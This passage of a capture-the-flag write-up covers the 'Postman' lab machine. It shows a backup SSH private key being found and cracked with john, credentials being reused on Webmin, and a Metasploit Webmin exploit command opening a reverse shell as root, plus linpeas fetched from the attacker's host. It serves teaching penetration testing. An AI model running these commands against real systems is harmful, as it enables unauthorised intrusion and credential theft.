+2026-05-12 14:35:42 <span class="o">(</span>2.16 MB/s<span class="o">)</span> - ‘linpeas.sh’ saved <span class="o">[</span>1031313/1031313]
+
+redis@Postman:~<span class="nv">$ </span><span class="nb">chmod</span> +x ./linpeas.sh
+redis@Postman:~<span class="nv">$ </span>./linpeas.sh | <span class="nb">tee </span>lin.out
+
+&lt;SNIP&gt;
+
+══╣ Kernel modules loadable?  <span class="o">(</span>T1547.006<span class="o">)</span>
+Modules can be loaded
+══╣ Module signature enforcement?  <span class="o">(</span>T1547.006<span class="o">)</span>
+Not enforced
+
+╔══════════╣ Kernel Exploit Registry <span class="o">(</span>T1068<span class="o">)</span>
+═╣ Operating system ............. Linux
+═╣ Kernel release ............... 4.15.0-58-generic
+═╣ Comparable version ........... 4.15.0.58
+═╣ Data chunk limit ............. max 25 rows per KERNEL_CVE_DATA_<span class="k">*</span> variable <span class="o">(</span>1..21<span class="o">)</span>
+═╣ Kernel config <span class="nb">source</span> ......... /boot/config-4.15.0-58-generic
+CVE: CVE-2019-15666 | Name: XFRM_UAF | Match data: <span class="nv">pkg</span><span class="o">=</span>linux-kernel,ver&gt;<span class="o">=</span>3,ver&lt;5.0.19,CONFIG_USER_NS<span class="o">=</span>y,sysctl:kernel.unprivileged_userns_clone<span class="o">==</span>1,CONFIG_XFRM<span class="o">=</span>y | Tags: 1 | Rank: CONFIG_USER_NS needs to be enabled<span class="p">;</span> CONFIG_XFRM needs to be enabled
+CVE: CVE-2021-3493 | Name: Ubuntu OverlayFS | Match data: <span class="nv">pkg</span><span class="o">=</span>linux-kernel,ver&gt;<span class="o">=</span>3.13,ver&lt;5.14,x86_64 | Tags: <span class="nv">ubuntu</span><span class="o">=(</span>14.04|16.04|18.04|20.04|20.10<span class="o">)</span> | Rank: 1 | Details: Only Ubuntu is affected.
+CVE: CVE-2021-22555 | Name: Netfilter heap out-of-bounds write | Match data: <span class="nv">pkg</span><span class="o">=</span>linux-kernel,ver&gt;<span class="o">=</span>2.6.19,ver&lt;<span class="o">=</span>5.12-rc6 | Tags: <span class="nv">ubuntu</span><span class="o">=</span>20.04<span class="o">{</span>kernel:5.8.0-<span class="k">*</span><span class="o">}</span> | Rank: 1 | Details: ip_tables kernel module must be loaded
+CVE: CVE-2022-32250 | Name: nft_object UAF <span class="o">(</span>NFT_MSG_NEWSET<span class="o">)</span> | Match data: <span class="nv">pkg</span><span class="o">=</span>linux-kernel,ver&lt;5.18.1,CONFIG_USER_NS<span class="o">=</span>y,sysctl:kernel.unprivileged_userns_clone<span class="o">==</span>1 | Tags: <span class="nv">ubuntu</span><span class="o">=(</span>22.04<span class="o">){</span>kernel:5.15.0-27-generic<span class="o">}</span> | Rank: 1 | Details: kernel.unprivileged_userns_clone<span class="o">=</span>1 required <span class="o">(</span>to obtain CAP_NET_ADMIN<span class="o">)</span>
+═╣ Kernel vulns found: 4
+
+&lt;SNIP&gt;
+</code></pre></div></div>
+
+<p>Parallel, doing some manual enumeration, I found this:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>redis@Postman:~<span class="nv">$ </span>find / <span class="nt">-name</span> <span class="s2">"*id_rsa*"</span> 2&gt;/dev/null
+/opt/id_rsa.bak
+redis@Postman:~<span class="nv">$ </span><span class="nb">cat</span> /opt/id_rsa.bak
+<span class="nt">-----BEGIN</span> RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C
+
+JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
+cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
+7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
+cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
+1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
+EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
+UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
+Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
+t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
+5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
+P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
+jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
+SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
+l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
+0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
+S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
+hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
+Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
+XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
+b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
+WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
+KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
+npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
+VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
+X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw<span class="o">==</span>
+<span class="nt">-----END</span> RSA PRIVATE KEY-----
+</code></pre></div></div>
+
+<p>Probably <code class="language-plaintext highlighter-rouge">Matt</code>’s private key. But it’s encrypted:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>redis@Postman:~<span class="nv">$ </span>ssh <span class="nt">-i</span> /opt/id_rsa.bak Matt@localhost
+The authenticity of host <span class="s1">'localhost (::1)'</span> can<span class="s1">'t be established.
+ECDSA key fingerprint is SHA256:kea9iwskZTAT66U8yNRQiTa6t35LX8p0jOpTfvgeCh0.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '</span>localhost<span class="s1">' (ECDSA) to the list of known hosts.
+Enter passphrase for key '</span>/opt/id_rsa.bak<span class="s1">':
+</span></code></pre></div></div>
+
+<p>We have to crack it with <code class="language-plaintext highlighter-rouge">john</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat</span> <span class="o">&lt;&lt;</span> <span class="no">EOF</span><span class="sh"> &gt; matt_id_rsa.bak
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C
+
+JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
+cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
+7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
+cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
+1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
+EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
+UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
+Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
+t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
+5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
+P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
+jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
+SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
+l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
+0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
+S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
+hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
+Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
+XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
+b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
+WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
+KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
+npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
+VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
+X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
+-----END RSA PRIVATE KEY-----
+</span><span class="no">EOF
+</span></code></pre></div></div>
+
+<p>Now we use <code class="language-plaintext highlighter-rouge">ssh2john</code> in order to create a crackable hash out of the ssh private key so john can handle it easily:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh2john ./matt_id_rsa.bak <span class="o">&gt;</span> hash_for_john <span class="o">&amp;&amp;</span> <span class="se">\</span>
+  john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt hash_for_john
+  
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>SSH, SSH private key <span class="o">[</span>RSA/DSA/EC/OPENSSH 32/64]<span class="o">)</span>
+Cost 1 <span class="o">(</span>KDF/cipher <span class="o">[</span><span class="nv">0</span><span class="o">=</span>MD5/AES <span class="nv">1</span><span class="o">=</span>MD5/3DES <span class="nv">2</span><span class="o">=</span>Bcrypt/AES]<span class="o">)</span> is 1 <span class="k">for </span>all loaded hashes
+Cost 2 <span class="o">(</span>iteration count<span class="o">)</span> is 2 <span class="k">for </span>all loaded hashes
+Will run 8 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+computer2008     <span class="o">(</span>./matt_id_rsa.bak<span class="o">)</span>
+1g 0:00:00:00 DONE <span class="o">(</span>2026-05-12 15:44<span class="o">)</span> 10.00g/s 2468Kp/s 2468Kc/s 2468KC/s confused6..colin22
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed.
+</code></pre></div></div>
+
+<p>There it is: <code class="language-plaintext highlighter-rouge">computer2008</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">chmod </span>600 ./matt_id_rsa.bak <span class="o">&amp;&amp;</span> ssh <span class="nt">-i</span> ./matt_id_rsa.bak Matt@postman.htb
+<span class="k">**</span> WARNING: connection is not using a post-quantum key exchange algorithm.
+<span class="k">**</span> This session may be vulnerable to <span class="s2">"store now, decrypt later"</span> attacks.
+<span class="k">**</span> The server may need to be upgraded. See https://openssh.com/pq.html
+Enter passphrase <span class="k">for </span>key <span class="s1">'./matt_id_rsa.bak'</span>:
+Connection closed by 10.129.2.1 port 22
+</code></pre></div></div>
+
+<p>So the password was correct but somehow we can’t connect. But trying locally to <code class="language-plaintext highlighter-rouge">su</code> to Matt worked with that password:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>redis@Postman:~<span class="nv">$ </span>su Matt
+Password:&lt;computer2008&gt;
+Matt@Postman:/var/lib/redis<span class="nv">$ </span><span class="nb">cd</span> ~
+Matt@Postman:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
+<span class="o">[</span>REDACTED]
+</code></pre></div></div>
+
+<p>Here we go!</p>
+
+<hr />
+
+<h2 id="-32-privilege-escalation-matt---root">📈 3.2 Privilege Escalation (<code class="language-plaintext highlighter-rouge">Matt</code> -&gt; <code class="language-plaintext highlighter-rouge">root</code>)</h2>
+
+<p>Now upload linpeas again and enumerate the system:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Matt@Postman:~<span class="nv">$ </span>wget http://10.10.14.219:1101/linpeas.sh
+<span class="nt">--2026-05-12</span> 14:48:14--  http://10.10.14.219:1101/linpeas.sh
+Connecting to 10.10.14.219:1101... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1031313 <span class="o">(</span>1007K<span class="o">)</span> <span class="o">[</span>application/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh                     100%[<span class="o">==================================================&gt;]</span>   1007K  2.14MB/s    <span class="k">in </span>0.5s
+
+2026-05-12 14:48:14 <span class="o">(</span>2.14 MB/s<span class="o">)</span> - ‘linpeas.sh’ saved <span class="o">[</span>1031313/1031313]
+
+Matt@Postman:~<span class="nv">$ </span><span class="nb">chmod</span> +x ./linpeas.sh
+Matt@Postman:~<span class="nv">$ </span>./linpeas.sh | <span class="nb">tee</span> ./lin.out
+
+&lt;SNIP&gt;
+
+                                     ╔═══════╗
+═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════
+                                     ╚═══════╝
+</code></pre></div></div>
+
+<p>For some reason <code class="language-plaintext highlighter-rouge">linpeas</code> doesn’t go further and keeps stuck. Maybe that’s intended by the box creator for us to enumerate manually. Let’s do it then.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Matt@Postman:~<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-type</span> f 2&gt;/dev/null
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/traceroute6.iputils
+/usr/bin/newgrp
+/usr/bin/chsh
+/bin/fusermount
+/bin/umount
+/bin/su
+/bin/ping
+/bin/mount
+</code></pre></div></div>
+
+<p>After deep enumeration, we found nothing. But I remembered that there’s the <code class="language-plaintext highlighter-rouge">Webmin</code> page on port <code class="language-plaintext highlighter-rouge">10000</code>, maybe the credentials work there too:
+<img src="/assets/img/ctf/data/postman-6.png" alt="postman-6" /></p>
+
+<p>Indeed. <code class="language-plaintext highlighter-rouge">Matt</code>:<code class="language-plaintext highlighter-rouge">computer2008</code> works on the page.</p>
+
+<p>Searching for the version online I saw this:
+<img src="/assets/img/ctf/data/postman-7.png" alt="postman-7" /></p>
+
+<p>Let’s try it:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>msfconsole <span class="nt">-x</span> <span class="s2">"reload_all; use linux/http/webmin_packageup_rce; set PASSWORD computer2008; set RHOSTS 10.129.2.1; set RPORT 10000; set SSL true; set USERNAME Matt; set LHOST tun0; exploit"</span>
+
+&lt;SNIP&gt;
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using configured payload cmd/unix/reverse_perl
+PASSWORD <span class="o">=&gt;</span> computer2008
+RHOSTS <span class="o">=&gt;</span> 10.129.2.1
+RPORT <span class="o">=&gt;</span> 10000
+<span class="o">[!]</span> Changing the SSL option<span class="s1">'s value may require changing RPORT!
+SSL =&gt; true
+USERNAME =&gt; Matt
+LHOST =&gt; tun0
+[*] Started reverse TCP handler on 10.10.14.219:4444
+[+] Session cookie: 1ab0a1c169fd425ac6e7e2f2712cc51e
+[*] Attempting to execute the payload...
+[*] Command shell session 1 opened (10.10.14.219:4444 -&gt; 10.129.2.1:42174) at 2026-05-12 16:01:58 +0200
+
+whoami &amp;&amp; id
+root
+uid=0(root) gid=0(root) groups=0(root)
+cat /root/root.txt
+[REDACTED]
+</span></code></pre></div></div>
+
+<p>Here we go!</p>
+
+<p><img src="/assets/img/ctf/data/postman-8.png" alt="postman-8" /></p>
+
+<hr />
+
+<h2 id="-retrospective">🧠 Retrospective</h2>
+
+<ul>
+  <li><strong>Learnings:</strong>
+    <ol>
+      <li>Manual enumeration is king.</li>
+      <li>Whenever you find credentials, reuse them everywhere (Matt’s SSH password in Webmin).</li>
+      <li>Always take a deep look at services that should be password protected but aren’t.</li>
+    </ol>
+  </li>
+</ul>
+
+</div>
+
+
+
+
+
+
+
+
+
+
+
+    </div>
+
+  </body>
+</html>
